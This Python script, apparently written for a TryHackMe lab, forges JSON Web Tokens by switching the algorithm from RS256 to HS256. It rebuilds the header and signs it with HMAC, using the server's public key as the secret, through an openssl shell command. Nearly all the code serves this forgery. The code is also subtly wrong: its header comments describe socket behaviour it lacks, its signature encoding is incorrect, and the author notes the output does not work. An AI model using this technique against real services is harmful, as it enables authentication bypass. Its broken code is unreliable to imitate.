#!/usr/bin/env python
# This script was built for TryHackMe Scripting room[Task 3] [Hard] Encrypted Server Chit Chat

# This script will connect to a socket, send a message, and set a few veriables.
# It will then recursivly send a new message(s) to test if the returned value is the desired flag and 
# the checksum matches

import os
import subprocess
import binascii
import hmac
import base64
import hashlib
# import socket
import re
import binascii
# import json
import OpenSSL
# import ast
import sys


# # Change HOST to the victim machine"
# HOST="10.10.166.246"
# PORT = 80
# serverAddress = HOST, PORT

f = open("../TestFiles/public.pem",'r')
# print("public.pem: ", f.readline())
cert = f.read()

# line = f.readlines()
# print("public.pem: ", cert)

# line = line.join([str(x) for x in line])
# print("public.pem: ", line)
# pem = bytes(line, encoding='utf8')

def toHex(cert):
	hexString = ""
	for i in range(len(cert)):
		# print("hitz", bytes(cert[i], encoding='utf8'))
		hexChar = binascii.hexlify(bytes(cert[i], encoding='utf8'))
		# print("HexChar is:",hexchar)
		hexChar = str(hexChar).replace('b', '', 1).replace("\'", '', 2)
		# hexChar = hexChar.replace('b', '', 2) #print(s.replace('b', '', 1))
		# print("333",hexChar)
		hexString = hexString + hexChar
		# print(hexString)
	return hexString #+ str(bytes('0a', encoding='utf8')).strip("b\'")


def b64d(encoded):
	decoded = base64.b64decode(encoded)
	return decoded
def b64e(decoded):
	encoded = base64.b64encode(decoded)
	return encoded

try:
	newPem = toHex(cert)
	# print("hit here")
	# print("newPem: ", newPem)

	response = "JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNTk4MjIxNDExLCJleHAiOjE1OTgyMjE1MzEsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.PfQJFotp_nZWbTPSLCHCKTdWA298OUVH-lq8c2tcuP6k55Zf7Vn_nBnxwF0GonYgB8HK7_-HnbBrmHIIItFk5wCrG0ogKqhwgNHN_fNzQ0xnh7zXWxfUji8nwYORoxztsZ3CBf-SZzbO65cpu6r9dYTwxkaB-0Ez51bh9Hi1R-rj0hZwZh1gaVG0DmnuhCxbdFu_mJfG711HdRhonNuWCTiOiXHTe9soMqFJrX9Ae3hS9NGzorZLvGlKC9AN8Sat1u6UNlZstEd8veQsZf778U6F2Jf-exb6LtDRvxZNx3kgJRj5IAAPNlnT0bbfw8s09Imp8XguavXg4t4pqCUxwA"

	JWT = response.split(': ')
	# print("JWT Token:", JWT[1])
	
	head, payload, signature = JWT[1].split('.')
	decodedHead = b64d(head)
	# print("Original head: ", decodedHead.decode("UTF-8"))
	replacedHeader = decodedHead.decode("UTF-8").replace("RS256", "HS256")
	encodedHeader = b64e(bytes(replacedHeader, encoding='utf8')).decode("UTF-8")
	newHeader = str(encodedHeader).rstrip("=")
	print("newHeader: ", newHeader)
	



	# decodePayload = b64d(payload + "==").decode("UTF-8")
	# print("Org payload: ", decodePayload)
	# print("payload: ", type(decodePayload))
	# dictPayload = {"iss":"http://10.10.254.180/","iat":1598217030,"exp":159829999,"data":{"hello":"world"}}
	# dictPayload["exp"] = 159821799
	# dictPayload["iss"] = "http://10.10.254.180/"
	# dictPayload["data"] = {"hello":"world"}
	# stringPayload = str(dictPayload).replace("'", '"')
	# print("stringPayloadTYPE: ", type(dictPayload["data"]))
	# print("stringPayload: ", stringPayload.replace(" ", ''))

	# print("new dictPayload: ", str(dictPayload).replace("'", '"'))
	# encodedPayload = b64e(bytes(stringPayload.replace(" ", ''), encoding='utf8')).decode("UTF-8").rstrip("=")
	# print("new dictPayload: ", encodedPayload)

	
	# newPayloadData = {"iss":"http:\/\/demo.sjoerdlangkemper.nl\/","iat":1592043873,"exp":1592999999,"data":{"barry":"cool"}}
	# newPayloadData = {"iss":"Paradox","iat":1598020774,"exp":1592999999,"data":{"pingu":"noots"}}
	# replacedPayload = decodePayload.decode("UTF-8").replace("RS256", "SHA256")
	# print("payload: ", decodePayload)
	# print("signature: ", str(decodedHead))
	headAndPayload = newHeader+'.'+payload
	print("\nheadAndPayload: ", headAndPayload)

	bashCmdString = 'echo -n "{}" | openssl dgst -sha256 -mac HMAC -macopt hexkey:{}'.format(headAndPayload,newPem)
	print("bashCmdString: ", bashCmdString)
	process = subprocess.Popen(bashCmdString, shell=True, stdout=subprocess.PIPE)
# The output here in "process" is differrent than the needed output to make this script work for the lab. It needs to run in the cmdline itsself and not through python to get the proper output.

	# print("testing SDouT!!",stderr)
	subprocess_return = process.stdout.read()
	print("output1:", subprocess_return)
	sig = subprocess_return.decode("UTF-8").split('= ')[1]
	print("\nsig:", sig.strip())
	
	HEXSig = bytes.fromhex(sig.strip())
	print("\HEXSig:", HEXSig)

	# HEXSig = str(HEXSig)
	# print("HEXSig:", HEXSig)
	
	# b64Sig = base64.urlsafe_b64encode(HEXSig).replace("=",'')
	b64Sig = b64e(bytes(str(HEXSig), encoding='utf8')).decode("UTF-8")
	# print("b64Sig:", b64Sig)


	newJWT = headAndPayload+'.'+b64Sig
	print("\nnewJWT:", newJWT.rstrip("="))

except: 
	print("err")

